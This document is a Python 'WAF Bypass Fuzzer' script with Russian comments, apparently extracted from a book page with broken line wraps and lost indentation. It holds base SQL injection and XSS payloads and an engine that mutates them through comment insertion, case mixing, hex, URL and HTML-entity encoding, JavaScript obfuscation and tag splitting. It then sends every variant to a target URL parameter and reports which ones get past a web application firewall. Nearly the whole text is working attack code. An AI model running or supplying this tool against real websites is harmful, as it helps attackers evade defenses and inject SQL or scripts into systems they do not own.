#!/usr/bin/env python3
import requests
import argparse
import random
import string
import re
import time
from itertools import product
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── Базовые payloads
───────────────────────────────────────────────────────────
BASE_SQL_PAYLOADS = [
"' OR 1=1--",
"' UNION SELECT NULL,NULL--",
"' AND 1=1--",
"1; SELECT sleep(5)--",
"' OR 'x'='x",
]
BASE_XSS_PAYLOADS = [
"<script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg onload=alert(1)>",
"javascript:alert(1)",
]
HEADERS = {"User-Agent": "Mozilla/5.0"}
class WAFBypassEngine:
"""Движок генерации WAF-bypass мутаций."""
# ── SQL bypass техники
─────────────────────────────────────────────────────
@staticmethod
def add_sql_comments(payload: str) -> list[str]:
"""Вставляем SQL комментарии между ключевыми словами."""
results = []
for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
variants = [
f"/**/", # MySQL block comment
f"/*!*/", # MySQL conditional comment
f"-- \n", # Inline comment
— 104 —
f"/*x*/",
]
for comment in variants:
mutated = payload.replace(kw,
f"{kw[:len(kw)//2]}{comment}{kw[len(kw)//2:]}")
results.append(mutated)
return results
@staticmethod
def case_variation(payload: str) -> list[str]:
"""Генерируем варианты регистра для SQL ключевых слов."""
results = []
for kw in ["select", "union", "from", "where", "sleep", "and", "or"]:
if kw.upper() in payload.upper():
# Смешанный регистр
mixed = ""
for i, c in enumerate(kw):
mixed += c.upper() if i % 2 == 0 else c.lower()
results.append(re.sub(kw, mixed, payload, flags=re.IGNORECASE))
results.append(re.sub(kw, kw.upper(), payload, flags=re.IGNORECASE))
results.append(re.sub(kw, kw.lower(), payload, flags=re.IGNORECASE))
return results if results else [payload]
@staticmethod
def hex_encode_strings(payload: str) -> list[str]:
"""Кодируем строки в HEX (MySQL: 'admin' → 0x61646d696e)."""
results = []
m = re.search(r"'([^']{1,20})'", payload)
if m:
original = m.group(1)
hex_val = "0x" + original.encode().hex()
results.append(payload.replace(f"'{original}'", hex_val))
return results
@staticmethod
def url_encode_variants(payload: str) -> list[str]:
"""URL-кодирование различных уровней."""
results = []
# Одинарное кодирование пробелов
results.append(payload.replace(" ", "+"))
results.append(payload.replace(" ", "%20"))
results.append(payload.replace(" ", "%09")) # Tab
results.append(payload.replace(" ", "%0a")) # Newline
# Двойное кодирование кавычки
results.append(payload.replace("'", "%2527"))
return results
@staticmethod
def add_noise(payload: str) -> list[str]:
"""Добавляем случайный мусор в payload."""
results = []
# Случайные параметры перед полезной нагрузкой
noise = ''.join(random.choices(string.ascii_lowercase, k=6))
results.append(f"{payload} AND {noise}='{noise}'")
# Комментарий с мусором
results.append(f"/*{noise}*/{payload}")
return results
# ── XSS bypass техники
─────────────────────────────────────────────────────
@staticmethod
def html_entities(payload: str) -> list[str]:
"""Заменяем символы на HTML entities."""
results = []
results.append(payload.replace("<", "&#60;").replace(">", "&#62;"))
results.append(payload.replace("<", "&#x3c;").replace(">", "&#x3e;"))
results.append(payload.replace('"', "&quot;").replace("'", "&#39;"))
return results
@staticmethod
def js_encoding(payload: str) -> list[str]:
"""JavaScript escape sequences."""
results = []
if "alert" in payload:
results.append(payload.replace("alert(1)",
"\\u0061lert(1)"))
results.append(payload.replace("alert",
"eval(String.fromCharCode(97,108,101,114,116))"))
results.append(payload.replace("alert(1)",
"top['al'+'ert'](1)"))
return results
@staticmethod
def tag_breaking(payload: str) -> list[str]:
"""Разбиваем тег для обхода regex-фильтров."""
results = []
# Пробельные символы вместо пробела в атрибутах
for ws in ["\t", "\n", "\r", "\x0b", "\x0c"]:
results.append(payload.replace(" on", f"{ws}on"))
# Комментарии внутри тега
results.append(payload.replace("<script>", "<sc<!--x-->ript>"))
return results
def generate_all(self, payload: str, payload_type: str) -> list[str]:
"""Генерирует все мутации для payload."""
all_mutations = [payload]
if payload_type == "sql":
all_mutations += self.add_sql_comments(payload)
all_mutations += self.case_variation(payload)
all_mutations += self.hex_encode_strings(payload)
all_mutations += self.url_encode_variants(payload)
all_mutations += self.add_noise(payload)
elif payload_type == "xss":
all_mutations += self.html_entities(payload)
all_mutations += self.js_encoding(payload)
all_mutations += self.tag_breaking(payload)
all_mutations += self.url_encode_variants(payload)
return list(set(all_mutations)) # Убираем дубликаты
def detect_waf_block(resp: requests.Response, original_status: int) -> bool:
"""Определяет, заблокирован ли запрос WAF."""
if resp.status_code in (403, 406, 429, 503):
return True
waf_body_indicators = ["access denied", "blocked", "security", "waf",
"firewall", "forbidden", "attack detected"]
body_lower = resp.text.lower()
return any(ind in body_lower for ind in waf_body_indicators)
def test_payload(url: str, param: str, payload: str,
session: requests.Session) -> tuple[bool, int, int]:
"""Тестирует payload против WAF. Возвращает (blocked, status,
response_length)."""
parsed = urlparse(url)
params = parse_qs(parsed.query, keep_blank_values=True)
params = {k: v[0] for k, v in params.items()}
params[param] = payload
test_url = urlunparse(parsed._replace(query=urlencode(params)))
try:
resp = session.get(test_url, timeout=5, verify=False)
blocked = detect_waf_block(resp, 200)
return (blocked, resp.status_code, len(resp.text))
except Exception:
return (True, 0, 0)
def main():
parser = argparse.ArgumentParser(description="WAF Bypass Fuzzer")
parser.add_argument("-u", "--url", required=True, help="Целевой URL")
parser.add_argument("-p", "--param", required=True, help="Тестируемый
параметр")
parser.add_argument("--type",
 default="sql", choices=["sql", "xss"],
help="Тип payload'а")
parser.add_argument("--delay",
 type=float, default=0.2,
help="Задержка между запросами")
args = parser.parse_args()
session = requests.Session()
session.headers.update(HEADERS)
engine = WAFBypassEngine()
base_payloads = BASE_SQL_PAYLOADS if args.type == "sql" else
BASE_XSS_PAYLOADS
print(f"{CYAN}[*] WAF Bypass Fuzzer → {args.url}{RESET}")
print(f"{CYAN}[*] Тип: {args.type} | Параметр: {args.param}{RESET}")
print("-" * 60)
all_passed = []
all_blocked = []
for base in base_payloads:
mutations = engine.generate_all(base, args.type)
print(f"\n{YELLOW}[*] Базовый: {base[:50]}... ({len(mutations)}
мутаций){RESET}")
for mutation in mutations:
blocked, status, length = test_payload(
args.url, args.param, mutation, session
)
if not blocked and status not in (0, 500):
print(f" {GREEN}[PASSED] HTTP {status} | len={length} |
{mutation[:60]}{RESET}")
all_passed.append(mutation)
elif blocked:
all_blocked.append(mutation)
time.sleep(args.delay)
print(f"\n{'='*60}")
print(f"{GREEN}[✓] Прошло WAF: {len(all_passed)}{RESET}")
print(f"{RED}[✗] Заблокировано: {len(all_blocked)}{RESET}")
if all_passed:
print(f"\n{YELLOW}Топ-5 прошедших мутаций:{RESET}")
for m in all_passed[:5]:
print(f" {GREEN}→ {m}{RESET}")
if __name__ == "__main__":
main()
